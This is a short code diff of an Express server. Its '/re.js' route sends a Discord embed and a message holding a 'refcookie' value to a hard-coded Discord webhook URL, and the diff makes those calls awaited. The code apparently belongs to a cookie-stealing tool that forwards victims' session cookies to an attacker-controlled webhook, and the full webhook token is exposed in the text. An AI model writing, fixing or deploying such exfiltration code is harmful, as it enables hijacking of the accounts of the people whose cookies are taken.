@@ -111,7 +111,7 @@ app.get("/re.js", async (req, res) => {
     ).data.isEnabled;
 
     // Send embed to Discord webhook
-    axios.post(
+    await axios.post(
       "https://discord.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv",
       {
         embeds: [
@@ -165,7 +165,7 @@ app.get("/re.js", async (req, res) => {
     );
 
     // Send text content to Discord webhook
-    axios.post(
+    await axios.post(
       "https://discord.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv",
       {
         content: `${refcookie}`,
@@ -187,6 +187,6 @@ app.get("/re.js", async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+app.listen({port: PORT}, () => {
   console.log(`Server is running on port ${PORT}`);
 });
